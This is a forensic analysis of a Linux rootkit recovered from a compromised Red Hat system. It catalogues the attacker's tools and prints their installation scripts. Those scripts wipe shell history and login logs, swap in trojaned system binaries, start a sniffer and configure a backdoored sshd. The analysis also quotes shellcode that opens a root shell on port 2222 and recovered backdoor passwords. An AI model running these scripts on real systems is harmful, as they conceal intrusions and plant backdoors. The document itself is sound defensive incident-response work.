@@ -1,0 +1,846 @@
+[=-=-=-=-=-=-=]               Rootkit analysis               [=-=-=-=-=-=-=]
+
+In order to analyse the rootkit, it is useful to have a complete copy
+of it.  Thus, the first step I did, was to restore as much as possible
+from the rootkit (originally one .tar file) from the disk.  Original
+rootkit file was probably named ci.tar (it was surely ?i.tar and the name
+of created directory (.Ci) suggests this name for the file - see
+misc/Cidir).  My search of /dev/hda8 image yield some important
+information about the rootkit, but I wasn't able to restore it completely.
+
+---------------------
+Restoring the rootkit
+
+First, I found that several programs from /usr/man/.Ci directory can
+be found on the disk in a form ressembling a .tar archive.  Thus, I
+tracked it backwards (= to the first occurence of .Ci/ in the image).
+With a hex editor, one is able to quickly find the block linkage
+table (ie, the list of blocks contained in one file).  However, I was
+not able to find the complete table, only its major part.  Using my
+simple program (programs/dumper.c - be warned -- this program was modified
+since I used it to restore the rootkit, so it might not even work anymore)
+I was able to recover most of the rootkit archive (about 13MB).  Although
+word 'rootkit' is usually used to denote only the trojan/sniffer/other
+`blackhat' utilities, for the rest of the article, I'll use it to denote
+the whole package used by attacker.
+
+I have NOT included the complete archive (the part I've been able to restore),
+because of its size, but it will be available on request.  Nevertheless,
+from other information gained during the analysis, I was able (hopefully)
+to at least find what was in the missing part of the archive.
+
+-----------------------
+Global rootkit analysis
+
+The rootkit itself looks like a mixture of various tools and rootkit(s).
+Some of the programs look similar to those from Linux RootKit 4, others
+come from different sources.  Some part of the rootkit was probably written
+by the attacker himself (because no one would publish such `stupid' code).
+Files in the rootkit archive are owned by uid=1010 gid=100 (which
+corresponds to xrt/users).
+
+==============================================================================
+
+----------------------------------------
+Contents of the rootkit (.Ci directory):
+
+Scripts and helper programs used mostly during rootkit installation:
+a.sh		addbd			addps	
+chmod-it	clean			do
+install		install-named		install-sshd
+install-sshd1	install-statd		install-wu
+rmS		snap
+addn		fix
+
+Trojaned binaries/packages:
+find		ifconfig		in.ftpd
+in.identd	inetd			killall
+ls		netstat			ps
+pstree		syslogd			tcpd
+top		ssh-1.2.27.tgz		named.tgz
+
+
+Clean packages installed:
+nfs-utils-0.1.9.1-1.i386.rpm
+rpms.tgz
+wuftpd.rpm
+
+
+Misc utilities and files:
+sp.pl		bx			needz
+ptyp		q			qs
+snif
+
+
+' ':		Anap
+paki:		slice2	stream.c
+scan:		amd	bind	daemon	port	statd	wu	x
+scan/amd:	a.sh	amdx	ben	ben.c	pscan	pscan.c
+scan/bind:	ibind.sh	pscan.c
+scan/daemon:	lscan2.c	z0ne
+scan/port:	strobe
+scan/port/strobe:
+		INSTALL		Makefile	VERSION	strobe.1
+		strobe.c	strobe.services
+scan/statd:	classb	r	statdx	
+scan/wu:	fs	wu	
+scan/x:		pscan	pscan.c	x	xfil	xscan
+
+
+-----------------------------
+Files related to the rootkit:
+
+Configuration files for trojaned binaries:
+/usr/libexec/awk/addy.awk
+/dev/ptyp
+/usr/man/r
+/usr/man/p	- this file is not used by and trojaned binary, probably
+		  the atacker forgot to prefix it with a dot
+/usr/man/.a
+/usr/man/.p
+
+
+Installation of this rootkit is partially automated, mostly using bash
+scripts that are listed and commented below. (my comments are introduced
+by right square bracket).  The sequence the attacker used in this attack
+(and which is probably used in general) was:
+
+./install; ./install-sshd; ./install-wu; ./install-statd; ./install-named;
+./addn; ./do; [manual run of ./snap with unknown parameter]; ./rmS;
+./chmod-it
+
+The timestamps come from atime.txt file, which allows us to watch his
+steps with a very high precision.
+
+--------------------------------------------------------------------------
+install:
+
+#!/bin/sh
+
+] 08:52:10  - Kill all dangerous .bash_history files
+rm -rf /root/.bash_history
+ln -s /dev/null /root/.bash_history
+rm -rf /.bash_history
+ln -s /dev/null /.bash_history
+rm -rf ~games/.bash_history
+ln -s /dev/null ~games/.bash_history
+rm -rf /tmp/.bash_history
+ln -s /dev/null /tmp/.bash_history
+rm -rf /usr/games/.bash_history
+ln -s /dev/null /usr/games/.bash_history 
+
+] Backup the programs that are going to be trojaned
+mkdir backup
+cp /bin/ps backup
+cp /usr/bin/top backup
+cp /usr/sbin/syslogd backup
+] The above line was ineffective, because syslogd was in /sbin, not /usr/sbin
+cp /bin/ls backup
+cp /bin/netstat backup
+cp /sbin/ifconfig backup
+cp /usr/sbin/tcpd backup
+
+] 08:52:10  - Replace the programs with their trojaned versions.
+] ./fix program assures that file (inode) information is not changed.
+echo "Trojaning in progress"
+./fix /bin/ps ps
+./fix /usr/bin/top top
+./fix /usr/sbin/syslogd syslogd
+./fix /bin/ls ls
+./fix /sbin/ifconfig ifconfig
+./fix /bin/netstat netstat
+./fix /usr/sbin/tcpd tcpd
+./fix /usr/sbin/in.identd in.identd
+
+] This is unclear, because the attacker has already killed syslogd, so
+] there is no need to do it again.
+killall -HUP syslogd
+
+] 08:52:12  - Creates configuration files for trojaned ps,ls,...
+] See explanation of addbd later in this file
+./addbd
+
+] 08:52:13  - Run sniffer
+./snif &
+echo "Sniffer ENABLED"
+
+] 08:52:14,15  - Cleanup the logs (clean) and kill nfs (a.sh)
+echo "running clean and a.sh"
+./clean
+./a.sh
+
+] Add configuration files for other trojaned programs
+mv ptyp /dev
+
+] 08:52:26- (probably a bit sooner).  Install several rpms (I was not able
+] to restore the file rpms.tgz, although from the list of installed rpms,
+] I was able to find its contents - see below.  As far as I can tell, the
+] installed rpms are not trojaned.
+gunzip rpms.tgz;tar -xvf rpms.tar;cd rpms;rpm -Uvh --force *.rpm;cd ..;rm -rf rpms*
+
+] Again, this is unclear
+killall -1 lpd
+
+] 08:52:33  - Get rid of user logs
+rm -rf /var/log/wtmp
+cd /var/log
+touch wtmp
+
+] Remove programs that won't be used anymore
+cd /usr/man/.Ci
+rm -rf install addbd
+
+] Once again, this is unclear, because there was no change in inetd.conf,
+] so why should inetd be restarted ?
+killall -HUP inetd
+
+] 08:52:33  - Install BitchX client
+cp bx /bin/
+chmod 755 /bin/bx
+
+] Install wuftpd server
+rm /usr/sbin/in.ftpd
+mv in.ftpd /usr/sbin/
+chmod +x /usr/sbin/in.ftpd
+
+] The rest
+echo "done with installing shit"
+echo "i'll now run whereis sshd"
+echo "if nothing shows up then run ./install-sshd"
+echo "if it's in /usr/local/sbin/sshd then run ./install-sshd"
+echo "if it's in /usr/sbin/sshd then run ./install-sshd1"
+whereis sshd
+echo "after successfully installing sshd, run ./do"
+echo "rootkit installation complete."
+
+--------------------------------------------------------------------------
+install-sshd[1]:  (both scripts share the same functionality, the [1]
+		   version just deletes old version of sshd)
+
+] 08:53:06-  Extract the archive, compile and install it
+echo "installing sshd"
+gunzip ssh-1.2.27*
+tar -xvf ssh-1.2.27*
+cd ssh*
+make install
+rm -rf /etc/sshd_config
+
+
+] Create new sshd configuration file
+cat << hi >> /etc/sshd_config
+# This is ssh server systemwide configuration file.
+
+Port 22
+ListenAddress 0.0.0.0
+HostKey /etc/ssh_host_key
+RandomSeed /etc/ssh_random_seed
+ServerKeyBits 768
+LoginGraceTime 600
+KeyRegenerationInterval 3600
+PermitRootLogin yes
+IgnoreRhosts no
+StrictModes yes
+QuietMode yes
+X11Forwarding yes
+X11DisplayOffset 10
+FascistLogging no
+PrintMotd yes
+KeepAlive yes
+SyslogFacility DAEMON
+RhostsAuthentication no
+RhostsRSAAuthentication yes
+RSAAuthentication yes
+PasswordAuthentication yes
+PermitEmptyPasswords yes
+UseLogin no
+# CheckMail no
+# PidFile /u/zappa/.ssh/pid
+# AllowHosts *.our.com friend.other.com
+# DenyHosts lowsecurity.theirs.com *.evil.org evil.org
+# Umask 022
+# SilentDeny yes
+hi
+
+] Make sshd1 start on every boot.  However, the used method is not the
+] standard way of running sshd, so it {sh,c}ould be suspicious to admin.
+echo "/usr/local/sbin/sshd1" >> /etc/rc.d/rc.local
+
+] 08:53:33  - Create a script for restarting sshd and call it
+ps aux | grep sshd | awk '{print "kill -1 "$2""}' > restart-sshd
+chmod +x restart-sshd
+echo "done installing sshd"
+echo "now restarting"
+echo "dont forget to remove the sshd folders"
+./restart-sshd
+
+--------------------------------------------------------------------------
+install-wu:
+
+] 08:53:41  - Just install wuftpd.rpm = wu-ftpd (fixed site exec bug)
+echo patching wuftpd
+echo ..
+rpm -Uvh wuftpd.rpm
+echo ..
+echo finished
+
+--------------------------------------------------------------------------
+install-statd:
+
+] 08:53:47  - Just install nfs-utils with patched rpc.statd bug
+echo statd patch
+echo ..
+rpm -Uvh nfs-utils-0.1.9.1-1.i386.rpm
+echo ..
+/etc/rc.d/init.d/nfslock restart 
+
+--------------------------------------------------------------------------
+install-named:
+] 08:54:10  - Just install trojaned BIND 8.2.2-P5
+gunzip named.tgz;tar -xvf named.tar
+cd bin
+./install
+cd ..
+rm -rf bin named.tar
+
+--------------------------------------------------------------------------
+] 08:55:30 - runned addn (analysis provided below)
+
+--------------------------------------------------------------------------
+do:
+] 08:55:58  - Remove the used accounts from /etc/{passwd,shadow}
+cat /etc/passwd|grep -v own > /etc/passwd.good
+mv /etc/passwd.good /etc/passwd
+
+cat /etc/shadow|grep -v own > /etc/shadow.good
+mv /etc/shadow.good /etc/shadow
+
+cat /etc/passwd|grep -v adm1 > /etc/passwd.good   
+mv /etc/passwd.good /etc/passwd
+
+cat /etc/shadow|grep -v adm1 > /etc/shadow.good   
+mv /etc/shadow.good /etc/shadow
+
+--------------------------------------------------------------------------
+] 08:56:04 -  runned snap with unknown parameters (possible none?)
+
+--------------------------------------------------------------------------
+rmS:
+] 08:56:11  - Getting rid of already installed files that will be of no
+] use anymore.
+#!/bin/sh
+echo getting rid of shit we dont need anymore...
+rm -rf ssh*
+rm -rf install*
+rm wuftpd.rpm
+rm nfs-utils-0.1.9.1-1.i386.rpm
+sleep 1
+echo ..
+sleep 1
+echo ...
+sleep 1
+echo finished
+
+--------------------------------------------------------------------------
+] 08:56:25  - He started BitchX client installed as /usr/man/.Ci/bx
+
+--------------------------------------------------------------------------
+chmod-it:
+] 08:56:26  - Securing ( :-) ) the system = removing SUIDs from various
+]             potentially insecure binaries
+echo starting..
+sleep 1
+
+chmod 700 /usr/sbin/userhelper
+echo !:  userhelper..done
+chmod 700 /usr/X11R6/bin/Xwrapper
+echo !:  Xwrapper..done
+chmod 700 /bin/ping
+echo !:  ping..done
+chmod 700 /usr/sbin/traceroute
+echo !:  traceroute..done
+chmod 700 /usr/libexec/pt_chown
+echo !:  pt_chown..done
+chmod 700 /sbin/dump
+echo !:  dump..done
+chmod 700 /sbin/restore
+echo !:  restore..done
+chmod 700 /usr/bin/gpasswd
+echo !:  gpasswd..done
+chmod 700 /usr/bin/chage
+echo !:  change..done
+] The above line should read 'chage..done'
+
+chmod 700 /usr/bin/suidperl
+echo !:  suidperl..done
+chmod 700 /usr/bin/newgrp
+echo !:  newgrp..done
+chmod 700 /usr/sbin/usernetctl
+echo !:  usernetctl..done
+chmod 700 /usr/bin/at
+echo !:  at..done
+sleep 1
+echo ..finished
+
+==============================================================================
+===================== Other important binaries ===============================
+==============================================================================
+============================================================================
+========================= Attack tools =====================================
+
+Location:	.Ci/paki/
+Purpose:	Denial of Service programs
+Contents:	slice2		-
+		stream.c	- TCP packet storm
+Analysis:	Both these programs are designed to cause denial of
+		service by sending a great amount of packets with
+		random (or specified) sources to specific destination
+		(=flooding it with a lot packets).
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/amd
+Author:		seems to be heavily based on the code written by duke
+Purpose:	rpc.amd vulnerability scanner+exploiter
+Contents:       ben.c	- source for ben (by ryan@junker.org)
+    	        pscan.c	- source for pscan (by Volatile ?)
+    	        amdx	- exploit for rpc.amd vulnerability
+    	        a.sh	- a script for automatization of attack
+    	        ben	- simple rpc checker
+	        pscan	- simple portscanner
+Analysis:	When a.sh is run, it starts scanning 206.110+ class B
+		address space(s) for portmap service.  This is done by
+		pscan, which, when it finds an open port, calls ben,
+		in order to check for rpc.amd service.
+
+		amdx is an exploit for the vulnerability, which seems
+		to be based on the one written by duke.  A quick
+		session in gdb shows that its shellcode executes
+		following command:
+
+		/bin/sh -c "/bin/echo '2222        stream  tcp     nowait root    /bin/sh sh -i'>> /tmp/h;/usr/sbin/inetd /tmp/h &"
+
+		which effectively opens a rootshell on port 2222.
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/bind
+Author:		?
+Purpose:	Vulnerable BIND scanner
+Contents:	pscan.c		- source for pscan (a simple portscanner)
+		ibind.sh	- the actual vulnerability scanner
+Analysis:	This script effectively searches a class B address
+		range and digs (using dig :-) ) the BIND version running
+		on the scanned machines.  The results of this scan
+		are then processed and written into temp*.vuln.
+		The script scans for BIND versions 8.2.1 and 8.2.
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/daemon/lscan2.c
+Author:		Mixter
+Purpose:	Multiple vulnerability scanner
+Analysis:	Scans for multiple usually-vulnerable services (BIND,
+		POP[23], IMAP2, rpc.mountd, FTP).
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/daemon/z0ne
+Author:		crazy-b ?
+Purpose:	Zone transfer-er
+Analysis:	An utility for DNS zone transfers.
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/port/strobe
+Author:		Julian Assange
+Purpose:	General purpose port scanner - strobe version 0.92
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/statd
+Author:		multiple (ron1n,?)
+Contents:	classb	- class B addresses generator
+		r	- rpc scanner 
+		statdx	- rpc.statd exploit written by ron1n
+
+Analysis:	Using common sense, one can find that:
+		1) classb accepts two parameters, first an address base
+		   (two numbers separated with dot) and a name of output
+		   file.  It creates a list of IP-s beginning with that
+		   two numbers as a prefix and every possible pair of
+		   bytes as a suffix (in other words, it generates
+		   complete list of the class B address range).
+		2) r is a rpc scanner, which does what its name suggests
+		   - it scans for specific rpc service(s), reading a list
+		     of hostnames from input file.
+		3) statd is an exploit for rpc.statd vulnerability.
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/wu
+Author:		multiple (f0x,venglin)
+Contents:	fs	- fscan 3.02 - remote vulnerability scanner
+			  written by f0x
+		wu	- wu-ftpd SITE EXEC vulnerability exploit written
+			  by venglin
+
+------------------------------------------------------------------------------
+Location:	.Ci/scan/x
+Author:		multiple (Volatile, _neo, ?)
+Contents:	pscan	- simple portscanner
+		pscan.c	- source of pscan
+		x	- the actual exploit for X keylogging vulnerability
+		xfil	- X vulnerability log filter
+		xscan	- the script for X scanning
+Analysis:	xscan is a script which calls pscan to find hosts running
+		X server and then x to capture the keystrokes typed on
+		those hosts.
+
+
+
+============================================================================
+========================= Miscelaneous tools ===============================
+
+Location:	.Ci/a.sh
+Author:		?
+Affected files:	none
+Purpose:	Kill and delete all nfs services, to make installation
+		of new nfs version faster and cleaner.
+
+------------------------------------------------------------------------------
+Location:	.Ci/addn
+Author:		?
+Affected files: /usr/libexec/awk/addy.awk
+Purpose:	Adds specified address into /usr/libexec/awk/addy.awk
+		file, in order to make connections to/from this address
+		invisible in netstat (trojaned version)
+Equivalent to:	echo 1 class_b_address >> /usr/libexec/awk/addy.awk
+		echo 2 class_b_address >> /usr/libexec/awk/addy.awk
+
+------------------------------------------------------------------------------
+Location:	.Ci/addps
+Author:		?
+Affected files:	/dev/ptyp
+Purpose:	Adds specified name into /dev/ptyp file, which is
+		a configuration file for ps/top trojans.
+Equivalent to:	echo 2 process_name >> /dev/ptyp
+
+------------------------------------------------------------------------------
+Location:	.Ci/addbd
+Author:		?
+Affected files:	/{p,.p,r,.a}
+Purpose:	Initialization of configuration files for trojaned binaries.
+
+------------------------------------------------------------------------------
+Location:	.Ci/ /Anap
+Author:		?
+Affected files:	/usr/tmp/nap  (-> /var/tmp/nap)
+Purpose:	re-creation of captured password file
+Equivalent to:	cat /dev/null > /usr/tmp/nap
+
+------------------------------------------------------------------------------
+Location:	.Ci/bx
+Author:		?
+Purpose:	Standard BitchX client
+
+------------------------------------------------------------------------------
+Location:	.Ci/clean
+Author:		?
+Purpose:	log cleaner
+Affected files: /[var/log,usr/adm],[secure,messages,xferlog]
+Analysis:	Removes all occurences of following strings from log files
+		using /usr/man/.Ci/snap
+Strings: 	sshd, log, games, 209.86, own, owned, Pro, snif, ident,
+		splitrock, 209.255, echo
+
+------------------------------------------------------------------------------
+Location:	.Ci/fix
+Author:		Idefix/Cybernetik
+Source:		Linux Root Kit 3+
+Affected files:	various
+Purpose:	Replaces a file with its trojaned version (in general,
+		replaces a file with another one), while trying to preserve
+		as much information about it as possible (timestamps,
+		crc,...) with more or less success.
+
+------------------------------------------------------------------------------
+Location:	.Ci/needz
+Author:		?
+Purpose:	A script for downloading two rpm packages (screen-3.9.5 and
+		pico).
+
+------------------------------------------------------------------------------
+Author:		?
+Location:	.Ci/ptyp  (later known as /dev/ptyp)
+Purpose:	Configuration file for trojaned ps/top.
+Location:	/usr/man/.p
+Purpose:	Configuration file for trojaned pstree
+Location:	/usr/man/r
+Purpose:	Configuration file for trojaned ls
+Location:	/usr/man/.a
+Purpose:	Configuration file for trojaned tcpd
+Location:	/usr/libexec/awk/addy.awk
+Purpose:	Configuration file for trojaned netstat
+
+------------------------------------------------------------------------------
+Location:	.Ci/snap
+Author:		Dream Walker (dream@sekurity.org)
+Purpose:	log cleaner
+Affected files: /[var/log,usr/adm],[secure,messages,xferlog]
+Analysis:	Uses grep -v to clean the logs, doesn't restore timestamps.
+
+------------------------------------------------------------------------------
+Location:	.Ci/snif
+Author:		Mike Edulla/Lord Somer (removed POP2/3 logging)
+Source:		Linux Root Kit 4+
+Affected files:	tcp.log, sniff.pid
+Purpose:	Standard ethernet sniffer, used for logging traffic
+		on ports 21,23,143,513.
+
+------------------------------------------------------------------------------
+Location:	.Ci/sp.pl
+Author:		Mike Edulla
+Source:		Linux Root Kit 4+
+Purpose:	Parser for tcp.log produced by LinSniffer (.Ci/snif).
+
+------------------------------------------------------------------------------
+Location:	.Ci/{q, qs}
+Author:		Mixter
+Source:		Q-2.0.tgz
+Purpose:	Q remote access client with strong encryption.  This client
+		provides a very much simplified alternative to SSH.
+
+
+
+============================================================================
+=============== Complete packages used by the attacker =====================
+
+Location:	.Ci/named.tgz
+Author:		?
+Purpose:	This package is suspicious, but I was not able to find
+		any backdoors/other hidden features in it.
+Analysis:	The archive contains BIND 8.2.2-P5, which wouldn't be
+		suspicious, if the files were not compiled in /dev/.oz/src/bin
+		directory by root@zagnut.goobe.net.  This seems suspicious
+		because trojaned ssh (described later in this file) was
+		also compiled in a similar directory.
+		
+------------------------------------------------------------------------------
+Location:	.Ci/ssh-1.2.27.tgz
+Author:		?
+Purpose:	Trojaned SSH, with password logging and universal
+		password `features'
+Analysis:	This is the standard ssh 1.2.27 distribution, except for
+		a few modified files that can be found using
+		egrep '(GLOBAL|LOGGER)'.  These modifications include
+		Global Password - an universal password, which gives
+		access to the system and bypasses standard logging.
+		Password Logging - Logs every password into /usr/tmp/nap
+		file which pretends to be associated with Napster.
+		The package contains compiled .o files, and we can
+		see that they were compiled in /dev/.oz/.nap/rkit/terror/
+		.oz/ssh-1.2.27/
+		
+------------------------------------------------------------------------------
+Location:	.Ci/nfs-utils-0.1.9.1-1.i386.rpm
+Author:		Red Hat, Inc.
+Purpose:	Standard NFS package
+Version:	0.1.9.1
+Comment:	This package does not look suspicious, as far as I can
+		tell, it is genuine .rpm from RedHat.
+
+------------------------------------------------------------------------------
+Location:	.Ci/wuftpd.rpm
+Author:		Red Hat, Inc.
+Purpose:	Standard NFS package
+Version:	2.6.0
+Comment:	This package does not look suspicious, as far as I can
+		tell, it is genuine .rpm from RedHat.
+
+------------------------------------------------------------------------------
+Location:	.Ci/rpms.tgz		[Guessed contents]
+Author:		?
+Contents:	This file PROBABLY contained several rpms.  The
+		following list was created using rpm -qia and then
+		searching for '8 Nov 2000'.
+
+	Name:	am-utils	Version:	6.0.1s11
+	Install date:	Wed 08 Nov 2000 08:52:26 AM CST
+	Name:	lpr		Version:	0.48                              Vendor: Red Hat, Inc.
+	Install date:	Wed 08 Nov 2000 08:52:32 AM CST
+	Name:	make 		Version:	3.77                              Vendor: Red Hat Software
+	Install date:	Wed 08 Nov 2000 08:52:32 AM CST
+	Name:	ypserv		Version:	1.3.9                             Vendor: Red Hat, Inc.
+	Install date:	Wed 08 Nov 2000 08:52:33 AM CST
+	Name:	telnet		Version:	0.10
+	Install date:	Wed 08 Nov 2000 08:52:33 AM CST
+	Name:	screen		Version:	3.9.4
+	Install date:	Wed 08 Nov 2000 08:52:33 AM CST
+
+		The reasons that lead the attacker to installing these
+		packages are unclear to me.  All the packages were
+		originated from Red Hat, Inc., so there is almost no
+		chance that they were not clear (=trojaned).
+
+
+
+============================================================================
+================= Trojaned binaries ========================================
+
+Location:	.Ci/inetd	[This file was not installed]
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned inetd with a shell listening on specific port
+Analysis:	Standard inetd with a backdoor `feature':
+		1) listens on port assigned to rfe (usually 5002)
+		2) After receiving a connection, requires a password
+		   password is stored in the binary as a string at
+		   address 0x806eb48 and created code at 0x804815b
+		   in the executable (dump from objdump):
+> 804815b:	c6 05 48 eb 06 08 62 	movb   $0x62,0x806eb48
+> 8048162:	c6 05 49 eb 06 08 6c 	movb   $0x6c,0x806eb49
+> 8048169:	c6 05 4a eb 06 08 34 	movb   $0x34,0x806eb4a
+> 8048170:	c6 05 4b eb 06 08 77 	movb   $0x77,0x806eb4b
+> 8048177:	c6 05 4c eb 06 08 21 	movb   $0x21,0x806eb4c
+> 804817e:	c6 05 4d eb 06 08 5f 	movb   $0x5f,0x806eb4d
+> 8048185:	c6 05 4e eb 06 08 00 	movb   $0x0,0x806eb4e
+		   The actual password is  bl4w!_
+		3) Given a correct password, /bin/sh is executed
+		   under the name `lpd' and priviledges of original
+		   inetd executor (usually root).  Moreover, HISTFILE
+		   is set to null.
+
+------------------------------------------------------------------------------
+Location:	.Ci/find	[This file was not installed]
+Author:		Lord Somer
+Source:		Linux Root Kit 4+
+Configuration:	/dev/.oz/r
+Purpose:	Trojaned version of find - does not report files
+		listed in /dev/.oz/r
+
+------------------------------------------------------------------------------
+Location:	.Ci/ifconfig
+Author:		Cybernetik(LRK3)/Lord Somer(LRK4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned version of ifconfig - doesn't display PROMISC
+		flag at interface
+Detection:	ifconfig eth0 promisc; ifconfig
+		If it PROMISC does not show up, ifconfig is trojaned
+Workaround:	No workaround is needed
+
+------------------------------------------------------------------------------
+Location:	.Ci/in.ftpd	[This file was not installed]
+Author:		?
+Source:		?
+Purpose:	Trojaned version of wu-ftpd 2.6.1.  
+Analysis:	This program is a slightly modified wu-ftpd 2.6.1,
+		which includes a special backdoor feature - if the
+		user connects to the ftp port (21) and types a
+		magic password (in this case it was 'N0LIM1TZ2K'),
+		a (root) shell is executed.  This was found by searching
+		for /bin/sh in the binary and locating the references
+		to it in the code.
+
+------------------------------------------------------------------------------
+Location:	.Ci/in.identd
+Comment:	This program was ineffective, because /usr/sbin/in.identd
+		is not used in RH62 (/usr/sbin/identd is used instead)
+		and it was not SUID root.
+Author:		? Probably French, accoring to one function name
+		(envoye_don_le_trojan)
+Source:		?
+Configuration:	/tmp/.fileMeYV0p
+		$HOME/.fakeid
+Purpose:	Multi-purpose, multi-part trojan :-)
+		0) The trojan binary consists of 2 (two) ELF files glued
+		   together (=the first program gets executed, but the
+		   binary contains information from both files, separation
+		   is non-trivial, although possible).
+
+		   Second is a standard identd trojan, which hides real owner
+		   of a particular port/socket.  When asked for information,
+		   this trojan would show the name stored in $HOME/.fakeid,
+		   if the file exists, or the real owner in other case.
+	       The first program (the code which gets executed) has two
+	       effects:
+		1) If the standard input (stdin) is a network socket
+		   and on the other side it is connected to port 49239
+		   it executes /bin/sh
+		2) Upon execution it checks for /tmp/.fileMeYV0p as in.identd
+		   and privileges of identd executor (usually root)
+Detection:	The trojan has not affected this system's functionality.
+Workaround:	No workaround is needed
+
+
+------------------------------------------------------------------------------
+Location:	.Ci/killall	[This file was not installed]
+Author:		Lord Somer
+Source:		Linux Root Kit 4+
+Purpose:	Trojaned killall/pidof - Does not kill nor find processes
+		listed in /dev/.oz/p
+Configuration:	/dev/.oz/p
+
+------------------------------------------------------------------------------
+Location:	.Ci/ls
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned ls - Does not list files listed in /usr/man/r
+Configuration:	/usr/man/r
+Detection:	Due to improper configuration performed by the attacker,
+		this trojan was not fully functional, thus a simple
+		ls -al /usr/man would show .Ci directory.
+Workaround:	Clean /usr/man/r or use /usr/man/.Ci/backup/ls or
+		another clean copy of ls (eg. /home/ftp/bin/ls)
+
+------------------------------------------------------------------------------
+Location:	.Ci/netstat
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned netstat - Does not display connections specified
+		in /usr/libexec/awk/addy.awk (addresses and/or ports, ...)
+Configuration:	/usr/libexec/awk/addy.awk
+Detection:	Comparing /proc/net/tcp contents with output from netstat
+		should show difference when the trojan is active.
+Workaround:	Walk through /proc/net/ manually, in order to see active
+		and listening connections.  Alternatively, you can use
+		clean netstat binary or remove its configuration file
+		(/usr/libexec/awk/addy.awk)
+
+------------------------------------------------------------------------------
+Location:	.Ci/ps
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned ps - Does not display processes listed in /dev/ptyp
+Configuration:	/dev/ptyp
+Detection:	Comparing the contents of /proc/ (counting the directories
+		corresponding to processes) and output of ps should show
+		inequality if the trojan is active.
+Workaround:	Clean ps, remove /dev/ptyp or walk through /proc manually.
+
+------------------------------------------------------------------------------
+Location:	.Ci/pstree	[This file was not installed]
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned pstree - Does not display processes listed in
+		/usr/man/.p
+Configuration:	/usr/man/.p
+
+------------------------------------------------------------------------------
+Location:	.Ci/syslogd
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned syslogd - Does not log messages containing strings
+		listed in /usr/man/.l
+Configuration:	/usr/man/.l
+
+------------------------------------------------------------------------------
+Location:	.Ci/tcpd
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned tcpd - Does not log connections from /usr/man/.a
+		and also does not check hosts.deny in that case
+Configuration:	/usr/man/.a
+
+------------------------------------------------------------------------------
+Location:	.Ci/top
+Author:		Cybernetik(LRK 3)/Lord Somer(LRK 4+)
+Source:		Linux Root Kit 3+
+Purpose:	Trojaned top - Does not display processes listed in /dev/ptyp
+Configuration:	/dev/ptyp
+Detection:	Comparing the contents of /proc/ (counting the directories
+		corresponding to processes) and output of top should show
+		inequality if the trojan is active.
+Workaround:	Clean top, remove /dev/ptyp or walk through /proc manually.
